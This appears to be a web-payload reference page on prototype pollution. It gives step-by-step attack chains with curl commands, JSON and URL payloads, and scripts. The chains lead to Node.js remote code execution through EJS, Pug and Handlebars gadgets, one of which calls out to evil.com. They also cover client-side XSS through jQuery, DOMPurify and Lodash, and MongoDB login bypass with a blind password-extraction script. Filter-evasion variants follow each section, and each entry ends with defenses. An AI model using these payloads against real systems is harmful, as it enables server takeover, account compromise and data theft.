# Prototype Pollution

_3 web payloads_

### Server-Side Prototype Pollution to RCE  `proto-server-rce`
_Inject malicious properties by polluting the JavaScript object prototype chain (__proto__/constructor.prototype), then achieve remote code execution on the Node.js server by leveraging child_process or gadget chains in template engines such as EJS/Pug._
Subcategory: **Server-Side Exploitation** · tags: `Prototype Chain` `Prototype Pollution` `RCE` `Node.js` `__proto__`

**Prerequisites:**
- Target uses Node.js
- A JSON merge/deep-copy operation exists
- Controllable JSON input

**Attack Chain:**

**1. Detect the prototype pollution point**
> Test for prototype pollution via both the __proto__ and constructor.prototype methods
```
# Send a __proto__ pollution test
curl -X POST "https://{TARGET}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "test123"}}'

# constructor method
curl -X POST "https://{TARGET}/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "test123"}}}'

# Verify whether pollution succeeded (via error/behavior change)
curl "https://{TARGET}/api/debug" | grep "polluted"
```
**Syntax breakdown:**
- `__proto__` — the JavaScript prototype chain pointer, points to an object's prototype _keyword_
- `constructor.prototype` — alternative prototype chain access path, bypasses __proto__ filtering _keyword_
- `polluted` — test property — if a later request can read it, pollution is confirmed _value_

**2. EJS template engine RCE gadget**
> Achieve RCE by leveraging the EJS template engine's outputFunctionName/escapeFunction gadget
```
# EJS RCE gadget — pollute outputFunctionName
curl -X POST "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# Trigger template rendering
curl "https://{TARGET}/dashboard"

# EJS client parameter RCE
curl -X POST "https://{TARGET}/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"client": true, "escapeFunction": "1;return process.mainModule.require(\"child_process\").execSync(\"id\")"}}'
```
**Syntax breakdown:**
- `outputFunctionName` — the EJS template engine's output function name property, spliced into the generated function code _keyword_
- `process.mainModule.require` — the method in Node.js to import modules from an arbitrary context _function_
- `child_process` — the core Node.js module for executing system commands _value_
- `execSync("id")` — synchronously execute a system command _command_

**3. Pug template engine RCE gadget**
> Achieve code execution by leveraging known gadget chains in the Pug and Handlebars template engines
```
# Pug/Jade RCE gadget — pollute the block property
curl -X POST "https://{TARGET}/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"block": {"type": "Text", "val": "x]));process.mainModule.require(\"child_process\").execSync(\"curl evil.com/rce\");//"}}}'

# Handlebars RCE gadget
curl -X POST "https://{TARGET}/api/template" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"allowedProtoMethods": {"__defineGetter__": true}, "allowedProtoProperties": {"__defineGetter__": true}}}'
```
**Syntax breakdown:**
- `block.type: "Text"` — Pug AST node type, injects code into template compilation _json_
- `allowedProtoMethods` — Handlebars security option — once polluted, bypasses prototype method restrictions _keyword_

**4. Generic DoS/information disclosure gadget**
> Use generic gadgets to cause DoS, status code tampering, environment variable injection, and arbitrary file reads
```
# Pollute toString to cause an exception
{"__proto__": {"toString": null}}

# Pollute the status property to change the response
{"__proto__": {"status": 500}}

# Pollute environment variable injection
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}

# Pollute the shell property (combined with child_process.exec)
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\"))//"}}}
```
**Syntax breakdown:**
- `toString: null` — polluting toString causes a type conversion exception → DoS _technique_
- `NODE_OPTIONS` — Node.js startup argument environment variable _variable_
- `/proc/self/environ` — Linux process environment variable file _path_

**WAF/EDR Bypass Variants:**

**Bypassing __proto__ keyword filtering**
> Bypass __proto__ filtering via Unicode encoding, the constructor path, nested objects, and JSON5 syntax
```
# Unicode encoding
{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}

# constructor path
{"constructor": {"prototype": {"polluted": true}}}

# Nested path
{"a": {"__proto__": {"polluted": true}}}

# Use JSON5 syntax (if supported)
{__proto__: {polluted: true}}

# Array prototype pollution
{"__proto__": [], "length": 1, "0": "exploit"}
```
**Syntax breakdown:**
- `\u005f\u005f` — the Unicode encoding representation of __ _encoding_
- `constructor.prototype` — a prototype chain access method that replaces __proto__ _technique_

**Overview:** Prototype Pollution is a vulnerability type unique to JavaScript, exploiting JS's prototype inheritance mechanism. When an application uses an unsafe deep merge (lodash.merge/deepmerge, etc.) to merge user input into an object, an attacker can pollute Object.prototype via the __proto__ property, affecting all objects created afterward. Combined with gadget chains in specific template engines (EJS/Pug), RCE can be achieved.

**Vulnerability Principle:** Root causes: (1) in JavaScript, almost all objects inherit from Object.prototype; (2) recursive merge functions do not filter dangerous keys such as __proto__/constructor; (3) popular libraries such as lodash (<4.17.12), jQuery, and merge-deep have this vulnerability; (4) known RCE gadget chains exist when the server-side Node.js uses template engines such as EJS/Pug; (5) JSON.parse does not filter the __proto__ key. The affected APIs are typically PATCH/PUT-type configuration update endpoints.

**Exploitation Method:** Exploitation steps: (1) identify API endpoints that accept JSON input and perform object merging (e.g. PUT /settings, PATCH /profile); (2) send a __proto__ pollution test payload to confirm the vulnerability exists; (3) choose a gadget chain based on the target tech stack — EJS uses outputFunctionName/escapeFunction, Pug uses the block property; (4) craft an RCE payload injected into __proto__; (5) visit a page rendered by that template engine to trigger code execution; (6) if the template engine cannot be determined, first try DoS and information disclosure gadgets.

**Defensive Measures:** Defenses: (1) use Object.create(null) to create prototype-less safe objects; (2) filter the __proto__, constructor, and prototype keys in the merge function; (3) upgrade lodash to 4.17.21+ to fix the merge vulnerability; (4) use Map instead of a plain object to store user input; (5) enforce JSON Schema validation on JSON input, rejecting requests containing __proto__; (6) enable the --disable-proto=throw Node.js flag to disable __proto__ access.

---

### Client-Side Prototype Pollution to XSS  `proto-client-xss`
_Pollute the frontend JavaScript prototype chain via URL parameters, postMessage, or DOM manipulation, and achieve client-side XSS by leveraging gadgets in jQuery/DOM manipulation libraries. An attacker can trick a victim into triggering the vulnerability via a carefully crafted URL link._
Subcategory: **Client-Side Exploitation** · tags: `Prototype Chain` `XSS` `Client-Side` `jQuery` `DOM` `Prototype Pollution`

**Prerequisites:**
- The target frontend uses a vulnerable JS library
- Logic exists that converts URL parameters into objects

**Attack Chain:**

**1. Identify the client-side pollution source**
> Test frontend prototype pollution via URL parameters and hash fragments
```
# URL parameter parsing pollution (common in custom query parsers)
https://{TARGET}/page?__proto__[polluted]=test
https://{TARGET}/page?__proto__.polluted=test
https://{TARGET}/page?constructor[prototype][polluted]=test

# Hash fragment pollution
https://{TARGET}/page#__proto__[polluted]=test

# Verify: check in the console
console.log(({}).polluted); // If it outputs "test", pollution is confirmed
```
**Syntax breakdown:**
- `?__proto__[polluted]=test` — prototype pollution in URL parameter format _technique_
- `#__proto__[polluted]` — hash fragment pollution (not sent to the server) _technique_
- `({}).polluted` — check whether an empty object inherited the polluted property _function_

**2. jQuery html() gadget**
> Achieve XSS and property injection by leveraging jQuery's html() method and $.extend() deep copy
```
# Pollute jQuery's innerHTML gadget
# Step 1: pollute the prototype
https://{TARGET}/page?__proto__[innerHTML]=<img/src=x onerror=alert(document.domain)>

# Step 2: wait for jQuery to call $(element).html() or $.html()
# When jQuery creates a new element it reads the innerHTML property

# jQuery $.extend() deep copy pollution
$.extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
// Afterward, all obj.isAdmin return true
```
**Syntax breakdown:**
- `innerHTML` — jQuery reads this property when creating elements _keyword_
- `onerror=alert(document.domain)` — XSS payload — runs JS when the image fails to load _technique_
- `$.extend(true, ...)` — jQuery deep copy function (true=recursive) — propagates the pollution _function_

**3. DOMPurify bypass gadget**
> Achieve XSS by polluting DOMPurify configuration, Lodash template, and transport URLs
```
# Pollute DOMPurify configuration to achieve XSS
# Bypass ALLOWED_TAGS
https://{TARGET}/page?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src

# Pollute the sanitize behavior
https://{TARGET}/page?__proto__[ALLOW_ARIA_ATTR]=1&__proto__[IS_ALLOWED_URI][]=javascript

# Lodash template gadget
# If _.template is used and the options are polluted
https://{TARGET}/page?__proto__[sourceURL]=%22%0aalert(1)//

# Construct a complete POC link
https://{TARGET}/page?__proto__[transport_url]=javascript:alert(1)
```
**Syntax breakdown:**
- `ALLOWED_ATTR` — DOMPurify allowlist configuration — once polluted, allows dangerous attributes _keyword_
- `sourceURL` — Lodash template's sourceURL parameter — injected into eval _keyword_
- `javascript:alert(1)` — classic JavaScript pseudo-protocol XSS _technique_

**4. Automated detection script**
> Use Puppeteer to automatically detect client-side prototype pollution vulnerabilities in frontend pages
```
# PPScan — automated client-side prototype pollution detection
# Automated testing using Puppeteer
const puppeteer = require('puppeteer');
const browser = await puppeteer.launch();
const page = await browser.newPage();

// Inject detection script
await page.evaluateOnNewDocument(() => {
  const marker = Math.random().toString(36);
  Object.defineProperty(Object.prototype, '__pp_test__', {
    set: function(v) { window.__ppDetected = true; }
  });
});

await page.goto('https://{TARGET}/page?__proto__[__pp_test__]=1');
const detected = await page.evaluate(() => window.__ppDetected);
console.log('Prototype Pollution:', detected ? 'VULNERABLE' : 'NOT DETECTED');
```
**Syntax breakdown:**
- `evaluateOnNewDocument` — injects detection code before the page loads _function_
- `Object.defineProperty` — defines a property setter trap to detect prototype pollution _function_
- `__pp_test__` — custom detection marker property _variable_

**WAF/EDR Bypass Variants:**

**Bypassing URL parameter filtering**
> Bypass frontend prototype pollution filtering via URL encoding, the constructor path, and nested structures
```
# URL-encode __proto__
?__%70roto__[xss]=test
?%5f%5fproto%5f%5f[xss]=test

# Use the constructor path
?constructor[prototype][xss]=test
?constructor.prototype.xss=test

# Array index pollution
?__proto__[0]=payload

# Multi-layer nesting
?a[__proto__][xss]=test
?a.b.__proto__.xss=test
```
**Syntax breakdown:**
- `%5f%5f` — the URL encoding of __ _encoding_
- `__%70roto__` — partially encode the p character to bypass keyword matching _encoding_

**Overview:** Client-side prototype pollution is a vulnerability triggered in the browser via URL parameters, postMessage, and similar vectors. Unlike server-side, client-side pollution usually requires a "gadget" — a location in the code that reads the polluted property — to cause actual harm (such as XSS). Known gadget chains exist in popular frontend libraries such as jQuery, Lodash, and DOMPurify. Discovering and exploiting such vulnerabilities requires a deep understanding of JS prototype inheritance and the internal implementation of frontend libraries.

**Vulnerability Principle:** Root causes: (1) a frontend custom URL parameter parser converting ?a[b]=c into a nested object fails to filter __proto__; (2) older versions of third-party libraries such as qs and query-string have prototype pollution; (3) deep copy functions such as jQuery $.extend(true,...) and lodash.merge propagate pollution; (4) the configuration of security libraries such as DOMPurify can be overridden by prototype pollution and thereby disabled; (5) the default property system of frontend frameworks (Vue/React) may read polluted values.

**Exploitation Method:** Exploitation steps: (1) check whether the target page's JS code has a custom query parser or uses a known vulnerable library; (2) send __proto__[test]=1 via a URL parameter and verify in the console whether ({}).test returns 1; (3) if pollution succeeds, search the page code for gadgets — code locations that read a specific property name; (4) common gadgets: jQuery html() reads innerHTML, DOMPurify reads ALLOWED_ATTR, lodash template reads sourceURL; (5) construct a complete POC URL combining the pollution source and gadget to trigger XSS.

**Defensive Measures:** Defenses: (1) use a secure URL parameter parsing library (qs@6.10.0+ is fixed); (2) Object.freeze(Object.prototype) to freeze the prototype and prevent pollution (note compatibility); (3) upgrade libraries such as jQuery and Lodash to the latest version; (4) use Object.create(null) when creating objects; (5) enforce allowlist validation on URL parameter names, rejecting parameters containing __proto__/constructor; (6) use CSP (Content-Security-Policy) as the last line of defense against XSS.

---

### Prototype Pollution Combined with NoSQL Injection  `proto-nosql-injection`
_Combine prototype pollution with MongoDB/NoSQL injection. By polluting the prototype chain properties of a query object, bypass authentication logic or construct malicious query conditions, achieving authentication bypass and data leakage._
Subcategory: **Combined Exploitation** · tags: `Prototype Chain` `NoSQL` `MongoDB` `Authentication Bypass` `Combined Attack`

**Prerequisites:**
- Target uses MongoDB
- A prototype pollution point exists
- Query construction logic exists

**Attack Chain:**

**1. Identify the MongoDB query injection point**
> Test NoSQL injection using MongoDB operators ($ne/$regex/$gt) to achieve authentication bypass
```
# Test NoSQL operator injection
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# $regex matching
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

# $gt always-true condition
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'
```
**Syntax breakdown:**
- `{"$ne": ""}` — MongoDB not-equal operator — matches all non-empty values _operator_
- `{"$regex": ".*"}` — regular expression match — matches any string _operator_
- `{"$gt": ""}` — greater than empty string — matches all passwords _operator_

**2. Prototype pollution to bypass query validation**
> Leverage prototype pollution to inject a MongoDB $where condition, bypassing operator filtering
```
# Scenario: the backend has operator filtering
# if (hasOperator(input)) reject();

# Inject $where via prototype pollution
curl -X PATCH "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"$where": "function(){return true}"}}'

# Subsequent queries will inherit the $where condition
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "anything"}'
# If the login query uses the polluted object, the $where always-true condition causes authentication bypass
```
**Syntax breakdown:**
- `$where` — MongoDB server-side JS execution operator _operator_
- `function(){return true}` — always-true condition — all documents match _function_
- `__proto__` — injects $where into the query object via the prototype chain _keyword_

**3. Boolean blind injection to extract data**
> Use $regex blind injection to extract the password stored in MongoDB character by character
```
# Use $regex to extract the admin password character by character
import requests
import string

url = "https://{TARGET}/api/login"
password = ""
chars = string.ascii_letters + string.digits + string.punctuation

for i in range(32):
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{re.escape(c)}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "token" in r.text:
            password += c
            print(f"Found: {password}")
            break

print(f"Admin password: {password}")
```
**Syntax breakdown:**
- `$regex` — MongoDB regular expression operator _operator_
- `^{password}{c}` — anchored match — guesses character by character from the start _technique_
- `re.escape(c)` — escapes regex special characters to avoid syntax errors _function_

**4. Database enumeration and export**
> Leverage the admin privileges obtained after the authentication bypass to enumerate and export sensitive data
```
# Use $func to execute server-side JS (older MongoDB)
curl -X POST "https://{TARGET}/api/search" \
  -H "Content-Type: application/json" \
  -d '{"$where": "function(){return this.role==\"admin\"}"}'

# Use the obtained authentication bypass to export data
curl -s "https://{TARGET}/api/users?limit=1000" \
  -H "Authorization: Bearer {ADMIN_TOKEN}" | jq '.[].email'

# Check the MongoDB REST interface (if exposed)
curl -s "https://{TARGET}:28017/" 2>/dev/null
curl -s "https://{TARGET}/api/db/_stats" 2>/dev/null
```
**Syntax breakdown:**
- `this.role=="admin"` — a JS expression in MongoDB $where _function_
- `28017` — MongoDB default REST interface port _value_
- `{ADMIN_TOKEN}` — admin token obtained via injection _variable_

**WAF/EDR Bypass Variants:**

**Bypassing NoSQL operator filtering**
> Bypass NoSQL injection filtering via Unicode encoding, Content-Type switching, and form format
```
# Unicode-encoded operator
{"username": "admin", "password": {"\u0024ne": ""}}

# Nested bypass
{"username": "admin", "password": {"$eq": {"$ne": ""}}}

# Leverage Content-Type differences
# application/x-www-form-urlencoded
username=admin&password[$ne]=&password[$regex]=.*

# Array injection
username=admin&password[0][$gt]=
```
**Syntax breakdown:**
- `\u0024ne` — the Unicode encoding of $ne — bypasses $ symbol filtering _encoding_
- `application/x-www-form-urlencoded` — switching Content-Type may bypass JSON validation _technique_
- `password[$ne]=` — NoSQL operator injection in form format _technique_

**Overview:** The combination attack of prototype pollution and NoSQL injection is an advanced exploitation technique. Prototype pollution alone may require a template engine gadget to achieve RCE, and NoSQL injection alone may be blocked by operator filtering. But when the two are combined, query validation logic can be bypassed via prototype pollution, injecting malicious MongoDB operators into a query that should be safe, achieving authentication bypass and data leakage. This demonstrates the power of vulnerability chains in real-world attacks.

**Vulnerability Principle:** Root causes: (1) prototype pollution exists when a Node.js backend uses functions such as lodash.merge to handle configuration/settings update requests; (2) MongoDB query construction fails to perform strict type checking on input (allowing objects as query values); (3) the backend's operator filtering only checks direct properties and not properties inherited through the prototype chain; (4) frameworks such as Express.js automatically convert the URL query parameter password[$ne]= into the nested object {password:{$ne:""}}; (5) MongoDB's $where operator allows the execution of arbitrary JavaScript.

**Exploitation Method:** Combined exploitation steps: (1) first test pure NoSQL injection — send $ne/$gt operators and observe response differences; (2) if blocked by a WAF or validation, find a prototype pollution entry point (e.g. PUT /settings, PATCH /config); (3) inject $where or override a property of the query validation logic via prototype pollution; (4) send the login request again, using the polluted prototype chain to bypass the operator check; (5) after obtaining an admin token, further enumerate user data; (6) use $regex blind injection to extract password hashes or plaintext passwords.

**Defensive Measures:** Defenses: (1) perform strict type validation on all JSON input (use schema validation libraries such as Joi/Zod); (2) use libraries such as mongo-sanitize to filter $ operators from queries; (3) disable MongoDB's $where operator (mongod --setParameter disableJavaScript=true); (4) fix prototype pollution: upgrade lodash / use Object.create(null) / filter the __proto__ key; (5) use bcrypt for password storage so that hashes obtained after an authentication bypass cannot be used directly; (6) enforce query parameterization: use mongoose's .find().where() rather than passing objects directly.

---
